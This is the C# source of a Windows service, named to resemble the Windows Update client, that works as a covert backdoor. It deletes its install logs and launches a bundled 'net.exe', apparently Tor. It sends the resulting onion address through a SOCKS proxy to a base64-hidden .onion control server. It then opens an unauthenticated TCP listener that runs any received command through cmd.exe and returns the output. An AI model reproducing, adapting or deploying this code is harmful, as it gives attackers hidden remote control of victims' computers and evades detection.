using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Text;
using System.Net;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;

namespace wuaucilt
{
    public partial class Service1 : ServiceBase
    {
        [DllImport("shell32.dll")]
        public static extern bool SHGetSpecialFolderPath(IntPtr hwndOwner, [Out]StringBuilder lpszPath, int nFolder, bool fCreate);

        private TcpListener tcpListener;
        private Thread listenThread;

        private const string NETFILE = "net.exe";
        private const string SERVICE_DOMAIN = "a2lzeWczM3JzY201NGhuNi5vbmlvbg==";
        private const int SERVICE_PORT = 1234;
        private const int PORT = 56789;
        private const string ENDL = "\r\n";

        public Service1()
        {
            InitializeComponent();
        }

        public static string GetSystemDirectory()
        {
            StringBuilder path = new StringBuilder(260);
            SHGetSpecialFolderPath(IntPtr.Zero, path, 0x0029, false);
            return path.ToString();
        }

        public static string b64d(string str)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(str));
        }

        private void ListenForClients()
        {
            this.tcpListener.Start();

            while (true)
            {
                TcpClient client = this.tcpListener.AcceptTcpClient();

                Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
                clientThread.Start(client);
            }
        }

        private string system(string command)
        {
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = " /C " + command,
                    WorkingDirectory = "C:\\WINDOWS\\system32",
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }
            };

            proc.Start();
            return proc.StandardOutput.ReadToEnd();

            /*string lines = "";
            while (!proc.StandardOutput.EndOfStream)
            {
                lines += proc.StandardOutput.ReadLine() + ENDL;
            }
            return lines;*/
        }

        private void HandleClientComm(object client)
        {
            TcpClient tcpClient = (TcpClient)client;
            NetworkStream clientStream = tcpClient.GetStream();

            byte[] message = new byte[4096];
            int bytesRead;
            string command;

            while (true)
            {
                bytesRead = 0;

                try
                {
                    ASCIIEncoding encoder = new ASCIIEncoding();

                    using (StreamReader reader = new StreamReader(clientStream, Encoding.UTF8))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            string output = "";

                            command = line;
                            output += "> " + command + ENDL;

                            if (command == "exit" || command == "quit")
                            {
                                tcpClient.Close();
                                return;
                            }
                            else
                            {
                                output += system(command) + ENDL;
                            }

                            byte[] buffer = encoder.GetBytes(output);
                            clientStream.Write(buffer, 0, buffer.Length);
                            clientStream.Flush();
                        }
                    }
                }
                catch
                {
                    break; // socket error
                }

                if (bytesRead == 0)
                {

                    break; // client disconnect
                }
            }

            tcpClient.Close();
        }

        public static void execute(string file, string arguments = "", string workingDirectory = null, bool wait = false)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = file;
            startInfo.Arguments = arguments;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            if (workingDirectory != null)
                startInfo.WorkingDirectory = workingDirectory;

            try
            {
                if (wait)
                {
                    using (Process exeProcess = Process.Start(startInfo))
                        exeProcess.WaitForExit();
                }
                else
                    Process.Start(startInfo);
            }
            catch (Exception)
            { }
        }

        public static bool isRunning(string process)
        {
            Process[] pname = Process.GetProcessesByName(NETFILE);
            if (pname.Length == 0)
                return false;
            else
                return true;
        }

        public static void ReadAll(NetworkStream stream, byte[] buffer, int offset, int size)
        {
            while (size != 0)
            {
                var read = stream.Read(buffer, offset, size);
                if (read < 0)
                {
                    throw new IOException("Premature end");
                }
                size -= read;
                offset += read;
            }
        }

        public static void sockSend(string address)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    client.Connect("127.0.0.1", 56788);
                    using (var stream = client.GetStream())
                    {
                        // Auth
                        var buf = new byte[300];
                        buf[0] = 0x05; // Version
                        buf[1] = 0x01; // NMETHODS
                        buf[2] = 0x00; // No auth-method
                        stream.Write(buf, 0, 3);

                        ReadAll(stream, buf, 0, 2);
                        if (buf[0] != 0x05)
                            throw new IOException("Invalid Socks Version");

                        if (buf[1] == 0xff)
                            throw new IOException("Socks Server does not support no-auth");

                        if (buf[1] != 0x00)
                            throw new Exception("Socks Server did choose bogus auth");

                        // Request
                        buf[0] = 0x05; // Version
                        buf[1] = 0x01; // Connect (TCP)
                        buf[2] = 0x00; // Reserved
                        buf[3] = 0x03; // Dest.Addr: Domain name
                        var domain = Encoding.ASCII.GetBytes(b64d(SERVICE_DOMAIN));
                        buf[4] = (byte)domain.Length; // Domain name length (octet)
                        Array.Copy(domain, 0, buf, 5, domain.Length);
                        var port = BitConverter.GetBytes(
                          IPAddress.HostToNetworkOrder((short)1234));
                        buf[5 + domain.Length] = port[0];
                        buf[6 + domain.Length] = port[1];
                        stream.Write(buf, 0, domain.Length + 7);

                        // Reply
                        ReadAll(stream, buf, 0, 4);
                        if (buf[0] != 0x05)
                            throw new IOException("Invalid Socks Version");

                        if (buf[1] != 0x00)
                            throw new IOException(string.Format("Socks Error {0:X}", buf[1]));

                        var rdest = string.Empty;
                        switch (buf[3])
                        {
                            case 0x01: // IPv4
                                ReadAll(stream, buf, 0, 4);
                                var v4 = BitConverter.ToUInt32(buf, 0);
                                rdest = new IPAddress(v4).ToString();
                                break;
                            case 0x03: // Domain name
                                ReadAll(stream, buf, 0, 1);
                                if (buf[0] == 0xff)
                                {
                                    throw new IOException("Invalid Domain Name");
                                }
                                ReadAll(stream, buf, 1, buf[0]);
                                rdest = Encoding.ASCII.GetString(buf, 1, buf[0]);
                                break;
                            case 0x04: // IPv6
                                var octets = new byte[16];
                                ReadAll(stream, octets, 0, 16);
                                rdest = new IPAddress(octets).ToString();
                                break;
                            default:
                                throw new IOException("Invalid Address type");
                        }
                        ReadAll(stream, buf, 0, 2);
                        var rport = (ushort)IPAddress.NetworkToHostOrder((short)BitConverter.ToUInt16(buf, 0));

                        // Make an HTTP request, aka. "do stuff ..."
                        using (var writer = new StreamWriter(stream))
                        {
                            writer.Write("GET /service/cache/" + address + " HTTP/1.1\r\nHost: " + b64d(SERVICE_DOMAIN) + ":" + SERVICE_PORT + "\r\n\r\n");
                            writer.Flush();
                            using (var reader = new StreamReader(stream))
                            {
                                while (true)
                                {
                                    var line = reader.ReadLine();
                                    if (string.IsNullOrEmpty(line))
                                        break;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { }
        }

        private bool isPortOpen(int port)
        {
            bool isAvailable = true;
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpConnections();

            foreach (TcpConnectionInformation tcpi in tcpConnInfoArray)
            {
                if (tcpi.LocalEndPoint.Port == port)
                {
                    isAvailable = false;
                    break;
                }
            }
            return isAvailable;
        }

        protected override void OnStart(string[] args)
        {
            string systemPath = GetSystemDirectory() + @"\com\tmp\";
            string netFile = systemPath + NETFILE;
            string hostnameFile = systemPath + "hostname";
            string[] serviceInstallLogs = { "InstallUtil.InstallLog", "service.InstallLog", "service.InstallState" };

            try
            {
                foreach (string file in serviceInstallLogs)
                {
                    if (File.Exists(systemPath + file))
                        File.Delete(systemPath + file);
                }

                if (File.Exists(netFile))
                {
                    while (true)
                    {
                        if (!isRunning(NETFILE))
                            execute(netFile, " -f rc", systemPath);

                        int i = 1;
                        while (!File.Exists(hostnameFile))
                        {
                            Thread.Sleep(2500);
                            i++;
                            if (i >= 10)
                                break;
                        }

                        if (i >= 10)
                            continue;

                        if (File.Exists(hostnameFile))
                        {
                            string[] tmp = File.ReadAllText(hostnameFile).Split('.');
                            string address = tmp[0];

                            sockSend(address);

                            break;
                        }
                    }

                    this.tcpListener = new TcpListener(IPAddress.Any, PORT);
                    this.listenThread = new Thread(new ThreadStart(ListenForClients));
                    this.listenThread.Start();
                }
            }
            catch(Exception)
            { }
        }

        protected override void OnStop()
        {
        }
    }
}
